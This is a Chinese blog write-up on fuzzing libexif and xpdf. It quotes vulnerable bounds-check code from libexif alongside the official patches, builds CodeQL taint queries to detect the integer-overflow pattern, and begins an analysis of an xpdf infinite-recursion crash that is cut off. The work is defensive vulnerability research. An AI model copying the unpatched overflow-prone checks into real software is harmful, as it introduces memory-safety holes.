class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Sanity checks */</span></span><br><span class="line"><span class="keyword">if</span> ((o + s &lt; o) || (o + s &lt; s) || (o + s &gt; ds) || (o &gt; ds)) {</span><br><span class="line">exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">"ExifData"</span>,</span><br><span class="line">  <span class="string">"Bogus thumbnail offset (%u) or size (%u)."</span>,</span><br><span class="line">  o, s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="crash-8"><a href="#crash-8" class="headerlink" title="crash 8"></a>crash 8</h4><p>同样的check问题.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">exif_mnote_data_olympus_load</span> <span class="params">(ExifMnoteData *en,</span></span><br><span class="line"><span class="params">      <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">unsigned</span> <span class="type">int</span> buf_size)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> (o + s &gt; buf_size) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Sanity check */</span></span><br><span class="line">    n-&gt;entries[i].data = exif_mem_alloc (en-&gt;mem, s);</span><br><span class="line">    <span class="keyword">if</span> (!n-&gt;entries[i].data) <span class="keyword">continue</span>;</span><br><span class="line">    n-&gt;entries[i].size = s;</span><br><span class="line">    <span class="built_in">memcpy</span> (n-&gt;entries[i].data, buf + o, s);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>官方修补方案</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((dataofs + s &lt; dataofs) || (dataofs + s &lt; s) || </span><br><span class="line">    (dataofs + s &gt; buf_size)) {</span><br><span class="line">exif_log (en-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG,</span><br><span class="line">  <span class="string">"ExifMnoteOlympus"</span>,</span><br><span class="line">  <span class="string">"Tag data past end of buffer (%u &gt; %u)"</span>,</span><br><span class="line">  dataofs + s, buf_size);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="crash-5"><a href="#crash-5" class="headerlink" title="crash 5"></a>crash 5</h4><p>同样的check问题.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exif_data_load_data</span> <span class="params">(ExifData *data, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *d_orig,</span></span><br><span class="line"><span class="params">     <span class="type">unsigned</span> <span class="type">int</span> ds_orig)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"><span class="comment">/* IFD 1 offset */</span></span><br><span class="line"><span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) {</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">n = exif_get_short (d + <span class="number">6</span> + offset, data-&gt;priv-&gt;order);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>官方修补:<br>虽然看起来还是有溢出,但”ds is restricted to 16 bit above, so offset is restricted too, and offset+8 should not overflow”. </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Sanity check the offset, being careful about overflow */</span></span><br><span class="line"><span class="keyword">if</span> (offset &gt; ds || offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds)</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></tbody></table></figure><h4 id="crash-10"><a href="#crash-10" class="headerlink" title="crash 10"></a>crash 10</h4><p>同样的check问题.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">exif_mnote_data_canon_load</span> <span class="params">(ExifMnoteData *ne,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">unsigned</span> <span class="type">int</span> buf_size)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (o + s &gt; buf_size) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity check */</span></span><br><span class="line">n-&gt;entries[i].data = exif_mem_alloc (ne-&gt;mem, <span class="keyword">sizeof</span> (<span class="type">char</span>) * s);</span><br><span class="line"><span class="keyword">if</span> (!n-&gt;entries[i].data) <span class="keyword">return</span>;</span><br><span class="line">n-&gt;entries[i].size = s;</span><br><span class="line"><span class="built_in">memcpy</span> (n-&gt;entries[i].data, buf + o, s);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>官方修补:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((dataofs + s &lt; s) || (dataofs + s &lt; dataofs) || (dataofs + s &gt; buf_size)) {</span><br><span class="line">exif_log (ne-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG,</span><br><span class="line"><span class="string">"ExifMnoteCanon"</span>,</span><br><span class="line"><span class="string">"Tag data past end of buffer (%u &gt; %u)"</span>,</span><br><span class="line">dataofs + s, buf_size);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="anoher"><a href="#anoher" class="headerlink" title="anoher"></a>anoher</h4><p>以及一个没有打出来的load函数中的check洞.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">exif_mnote_data_pentax_load</span> <span class="params">(ExifMnoteData *en,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">unsigned</span> <span class="type">int</span> buf_size)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">            <span class="keyword">if</span> (o + s &gt; buf_size) <span class="keyword">return</span>;</span><br><span class="line">                                                                                </span><br><span class="line">            <span class="comment">/* Sanity check */</span></span><br><span class="line">            n-&gt;entries[i].data = exif_mem_alloc (en-&gt;mem, <span class="keyword">sizeof</span> (<span class="type">char</span>) * s);</span><br><span class="line">            <span class="keyword">if</span> (!n-&gt;entries[i].data) <span class="keyword">return</span>;</span><br><span class="line">            n-&gt;entries[i].size = s;</span><br><span class="line">            <span class="built_in">memcpy</span> (n-&gt;entries[i].data, buf + o, s);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>官方修补:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((dataofs + s &lt; dataofs) || (dataofs + s &lt; s) ||</span><br><span class="line">(dataofs + s &gt; buf_size)) {</span><br><span class="line">exif_log (en-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG,</span><br><span class="line">  <span class="string">"ExifMnoteDataPentax"</span>, <span class="string">"Tag data past end "</span></span><br><span class="line">  <span class="string">"of buffer (%u &gt; %u)"</span>, dataofs + s, buf_size);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h3><p>为该漏洞模式编写CodeQL查询,漏洞建模为: 被ExifLoader-&gt;buf污染的转换后可能发生溢出的比较表达式.<br>编写整洁的CodeQL查询需要非常熟悉标准库,而笔者显然不是,所以编写的查询比较繁琐.</p><p>下方的查询共报出8个结果,命中5个漏洞点中的2个.<br>误报原因在于对ds变量取值范围分析不精,误报点不会发生溢出.<br>漏报的漏洞均来自exif-mnote-data-XXX.这三个函数是通过d-&gt;methods.load (d, buf, buf_size)的函数指针调用,猜测是污点分析时在函数指针的调用时中断.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> import cpp</span><br><span class="line"> import semmle.code.cpp.rangeanalysis.SimpleRangeAnalysis</span><br><span class="line"> import semmle.code.cpp.dataflow.new.DataFlow</span><br><span class="line"> import semmle.code.cpp.dataflow.new.TaintTracking</span><br><span class="line"> </span><br><span class="line">class PFFiledAccess extends FieldAccess</span><br><span class="line">{</span><br><span class="line">    PFFiledAccess() </span><br><span class="line">    {</span><br><span class="line">        exists(Access fa </span><br><span class="line">            |   (fa instanceof FieldAccess </span><br><span class="line">            or  fa instanceof PointerFieldAccess)</span><br><span class="line">            and this=fa)</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"> module FlowConfig implements DataFlow::ConfigSig</span><br><span class="line"> {</span><br><span class="line">     predicate isSource(DataFlow::Node source)</span><br><span class="line">     {</span><br><span class="line">         exists(PFFiledAccess pffa</span><br><span class="line">            | pffa.getQualifier().(VariableAccess).getTarget().getUnderlyingType().stripType().getName()="_ExifLoader"</span><br><span class="line">            and pffa.getTarget().getName() in ["buf"]</span><br><span class="line">            and source=DataFlow::exprNode(pffa))</span><br><span class="line">            </span><br><span class="line">     }</span><br><span class="line"> </span><br><span class="line">     predicate isSink(DataFlow::Node sink) </span><br><span class="line">     {</span><br><span class="line">        exists(Expr e</span><br><span class="line">            |(not e.getAChild().getType() instanceof PointerType)</span><br><span class="line">              and (convertedExprMightOverflow(e))</span><br><span class="line">            and e.getParent() instanceof RelationalOperation</span><br><span class="line">              and sink=DataFlow::exprNode(e))</span><br><span class="line">     }</span><br><span class="line"></span><br><span class="line"> }</span><br><span class="line"> </span><br><span class="line"> module Flow = TaintTracking::Global&lt;FlowConfig&gt;;</span><br><span class="line"> </span><br><span class="line">from DataFlow::Node source, DataFlow::Node sink,Expr sinke </span><br><span class="line">where Flow::flow(source, sink)</span><br><span class="line">and sinke = sink.asExpr()</span><br><span class="line">select source,sink,sinke.getChild(0).toString()+sink.toString()+sinke.getChild(1).toString(),sink.getLocation() as location order by location</span><br></pre></td></tr></tbody></table></figure><p>我像这样添加边,但查询结果没有变化</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">isAdditionalFlowStep</span><span class="params">(DataFlow::Node pred, DataFlow::Node succ)</span></span><br><span class="line">{</span><br><span class="line">   exists( ExprCall ec</span><br><span class="line">       |ec.getAnArgument() = pred.asExpr()</span><br><span class="line">       and ec.getTarget().getAParameter().getAnAccess() = succ.asExpr())  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>进一步测试并查询文档发现,对于VariableCall,getTarget谓词不能获取到目标.</p><blockquote><p>Gets the target of the call, as best as makes sense for this kind of call. The precise meaning depends on the kind of call it is: - For a call to a function, it’s the function being called. - For a C++ method call, it’s the statically resolved method. - For an Objective C message expression, it’s the statically resolved method, and it might not exist. - For a variable call, it never exists.</p></blockquote><p>找了下标准库发现没找到相关的实现,自己写一个.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function targetOfVariableCall(VariableCall vc) </span><br><span class="line">{</span><br><span class="line">    exists(Assignment a,FunctionAccess fa</span><br><span class="line">        |vc.getExpr().(ValueFieldAccess).getQualifier().(VariableAccess).getTarget().getAnAccess() = a.getLValue().(ValueFieldAccess).getQualifier()</span><br><span class="line">        and a.getRValue()=fa</span><br><span class="line">        and result=fa.getTarget())</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"> predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ)</span><br><span class="line"> {</span><br><span class="line">    exists( VariableCall ec</span><br><span class="line">        |ec.getAnArgument() = pred.asExpr()</span><br><span class="line">        and targetOfVariableCall(ec).getAParameter().getAnAccess() = succ.asExpr())  </span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>最终查询到13个结果,5个漏洞点均命中.</p><h2 id="CVE-2009-3895"><a href="#CVE-2009-3895" class="headerlink" title="CVE-2009-3895"></a>CVE-2009-3895</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>为之前的漏洞点打上Patch,继续Fuzz.<br>打出一个Crash.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403110059830.png"></p><p>跟到漏洞点,发现此时e-&gt;components的值是2147483664.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">exif_data_load_data_entry</span> <span class="params">(ExifData *data, ExifEntry *entry,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *d,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> offset)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; e-&gt;components; i++)</span><br><span class="line">exif_set_short (</span><br><span class="line">e-&gt;data + i *</span><br><span class="line">exif_format_get_size (</span><br><span class="line">EXIF_FORMAT_SHORT), o,</span><br><span class="line">(ExifShort) exif_get_long (</span><br><span class="line">e-&gt;data + i *</span><br><span class="line">exif_format_get_size (</span><br><span class="line">EXIF_FORMAT_LONG), o));</span><br><span class="line">e-&gt;format = EXIF_FORMAT_SHORT;</span><br><span class="line">e-&gt;size = e-&gt;components *</span><br><span class="line">exif_format_get_size (e-&gt;format);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>而在进行下方操作时,发生越界读取.由于i(uint32_t)作为循环变量,上限是由可控的e-&gt;components决定的,在乘法运算中可能会发生整数溢出.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exif_get_long (e-&gt;data + i *exif_format_get_size (EXIF_FORMAT_LONG), o)</span><br></pre></td></tr></tbody></table></figure><p>然而这里的整数正溢出是如何直接造成越界读取的呢?之前几个漏洞是整数溢出导致checker失效,也就是说直接导致越界读写的是绕过检测的恶意offset和读取大小超过了缓冲区实际大小.<br>来看下这里的缓冲区是怎么分配的,还是大小乘数量,虽然这里参与运算的entry-&gt;components是64位,但s是uint32_t,截断后与溢出发生同样效果.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//仅展示相关代码</span></span><br><span class="line"></span><br><span class="line">entry-&gt;components = exif_get_long  (d + offset + <span class="number">4</span>, data-&gt;priv-&gt;order);</span><br><span class="line"></span><br><span class="line">s = exif_format_get_size (entry-&gt;format) * entry-&gt;components;</span><br><span class="line"><span class="keyword">if</span> (!s)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (s &gt; <span class="number">4</span>)</span><br><span class="line">doff = exif_get_long (d + offset + <span class="number">8</span>, data-&gt;priv-&gt;order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">doff = offset + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">entry-&gt;data = exif_data_alloc (data, s);</span><br></pre></td></tr></tbody></table></figure><p>从道理上来说,分配和写入时使用同样的表达式,即使都发生溢出,但缓冲区的大小和(偏移+)写入的大小是匹配的,不会造成问题.然而这里是使用的循环变量i进行运算,由于分配时溢出实际分配到的缓冲区较小,则在i从0开始递增的过程中,这里不会发生溢出,偏移逐渐超过缓冲区大小造成越界读取.</p><p>所以实际的漏洞点应该是分配缓冲区时的整数溢出.<br>官方修补:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((s &lt; entry-&gt;components) || (s == <span class="number">0</span>)){</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="CodeQL-1"><a href="#CodeQL-1" class="headerlink" title="CodeQL"></a>CodeQL</h3><p>为什么之前的CodeQL查询漏掉了这个漏洞?下列是原因.</p><ol><li>之前的Sink建模为条件表达式,而这里显然不是.</li><li>CodeQL的污点并不会从一次具有污染性的FieldAccess传播到该Field所有的FieldAccess(如果这样建模污染就太广了).</li><li>CodeQL的污点不会从循环终止条件传播到循环计数器.</li></ol><p>处于练习的目的,我最小化的连上了相关的边.成功发现了该漏洞,但查询结果数也来到了171条.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">predicate classFieldTaintStep(DataFlow::Node pred,DataFlow::Node succ,string fn) </span><br><span class="line">{</span><br><span class="line">    exists(PFFiledAccess pffa </span><br><span class="line">        |pffa = pred.asExpr()</span><br><span class="line">        and pffa.getTarget().getName()=fn</span><br><span class="line">        and pffa.getTarget().getAnAccess() = succ.asExpr())</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">predicate forGuardTaintStep(DataFlow::Node pred,DataFlow::Node succ)</span><br><span class="line">{</span><br><span class="line">    exists(ForStmt fs, LoopCounter lc</span><br><span class="line">        |fs.getCondition().(RelationalOperation).getAChild() = lc.getAnAccess() </span><br><span class="line">        and fs.getCondition().(RelationalOperation).getAChild() = pred.asExpr()</span><br><span class="line">        and lc.getAnAccess()=succ.asExpr())</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-13288 xpdf 无限递归</title>
      <link href="/2024/Try%20Fuzzing%20-%20CVE-2019-13288%20xpdf%20Infinite-Recursion/"/>
      <url>/2024/Try%20Fuzzing%20-%20CVE-2019-13288%20xpdf%20Infinite-Recursion/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2019-13288"><a href="#CVE-2019-13288" class="headerlink" title="CVE-2019-13288"></a>CVE-2019-13288</h2><p>xpdf-3.02.<br>放两个最简单的pdf作为input,-s 123开跑.5秒后出现第一个crash.</p><h3 id="崩溃分析"><a href="#崩溃分析" class="headerlink" title="崩溃分析"></a>崩溃分析</h3><p>用第一个crash样例,复现一下<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091409464.png"></p><span id="more"></span><p>gdb启动,直接跑到奔溃点.可以看出是rsp到了不可写的内存区域.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091406553.png"></p><p>backtrace一下,发现栈回溯有十万条,结合rsp到了不可写区域,可以推理出是无限递归导致的段错误.<br>backtrace -40查看最开始的40条记录.发现绿色框中的一段调用序列在不断重复,这就是无限递归的调用序列.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091414814.png"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>结合回溯时的源码信息跟一下源码.在此之前需要对pdf格式有一个大概的了解:<br><a href="https://blog.csdn.net/tjcwt2011/article/details/107877566">https://blog.csdn.net/tjcwt2011/article/details/107877566</a><br><a href="https://zxyle.github.io/PDF-Explained/">https://zxyle.github.io/PDF-Explained/</a><br>遇到具体的问题再参照<a href="https://zxyle.github.io/PDF-Explained/resources/pdf_reference_1.7.pdf">pdf1.7标准参考</a></p><p>由于触发路径不长,可以直接从main函数开始跟,大概了解一下整个程序的流程.<br>发现触发时已经完成对pdf文件的基本解析,正在准备输出text文件.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// write text file</span></span><br><span class="line">textOut = new TextOutputDev(textFileName-&gt;getCString(),</span><br><span class="line">      physLayout, rawOrder, htmlMeta);</span><br><span class="line"><span class="keyword">if</span> (textOut-&gt;isOk()) {</span><br><span class="line">  doc-&gt;displayPages(textOut, firstPage, lastPage, <span class="number">72</span>, <span class="number">72</span>, <span class="number">0</span>,</span><br><span class="line">      gFalse, gTrue, gFalse);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  delete textOut;</span><br><span class="line">  exitCode = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">goto</span> err3;</span><br><span class="line">}</span><br><span class="line">delete textOut;</span><br></pre></td></tr></tbody></table></figure><p>一些dispatch:…</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PDFDoc::displayPages</span><span class="params">(OutputDev *out, <span class="type">int</span> firstPage, <span class="type">int</span> lastPage,</span></span><br><span class="line"><span class="params">  <span class="type">double</span> hDPI, <span class="type">double</span> vDPI, <span class="type">int</span> rotate,</span></span><br><span class="line"><span class="params">  GBool useMediaBox, GBool crop, GBool printing,</span></span><br><span class="line"><span class="params">  GBool (*abortCheckCbk)(<span class="type">void</span> *data),</span></span><br><span class="line"><span class="params">  <span class="type">void</span> *abortCheckCbkData)</span> {</span><br><span class="line">  <span class="type">int</span> page;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (page = firstPage; page &lt;= lastPage; ++page) {</span><br><span class="line">    displayPage(out, page, hDPI, vDPI, rotate, useMediaBox, crop, printing,</span><br><span class="line">abortCheckCbk, abortCheckCbkData);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PDFDoc::displayPage</span><span class="params">(OutputDev *out, <span class="type">int</span> page,</span></span><br><span class="line"><span class="params"> <span class="type">double</span> hDPI, <span class="type">double</span> vDPI, <span class="type">int</span> rotate,</span></span><br><span class="line"><span class="params"> GBool useMediaBox, GBool crop, GBool printing,</span></span><br><span class="line"><span class="params"> GBool (*abortCheckCbk)(<span class="type">void</span> *data),</span></span><br><span class="line"><span class="params"> <span class="type">void</span> *abortCheckCbkData)</span> {</span><br><span class="line">  <span class="keyword">if</span> (globalParams-&gt;getPrintCommands()) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"***** page %d *****\n"</span>, page);</span><br><span class="line">  }</span><br><span class="line">  catalog-&gt;getPage(page)-&gt;display(out, hDPI, vDPI,</span><br><span class="line">  rotate, useMediaBox, crop, printing, catalog,</span><br><span class="line">  abortCheckCbk, abortCheckCbkData);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Page::display</span><span class="params">(OutputDev *out, <span class="type">double</span> hDPI, <span class="type">double</span> vDPI,</span></span><br><span class="line"><span class="params">   <span class="type">int</span> rotate, GBool useMediaBox, GBool crop,</span></span><br><span class="line"><span class="params">   GBool printing, Catalog *catalog,</span></span><br><span class="line"><span class="params">   GBool (*abortCheckCbk)(<span class="type">void</span> *data),</span></span><br><span class="line"><span class="params">   <span class="type">void</span> *abortCheckCbkData)</span> {</span><br><span class="line">  displaySlice(out, hDPI, vDPI, rotate, useMediaBox, crop,</span><br><span class="line">       <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>, printing, catalog,</span><br><span class="line">       abortCheckCbk, abortCheckCbkData);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>经过分发dispatch之后,最后的输出由displaySlice实现,这里也是调用环的入口点.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Page::displaySlice</span><span class="params">(...)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">contents.fetch(xref, &amp;obj);</span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>先来看一下Object::fetch函数,从三目运算符中可以看出,这个函数是在传入的obj上构造当前对象.由于pdf格式中存在的Indirect 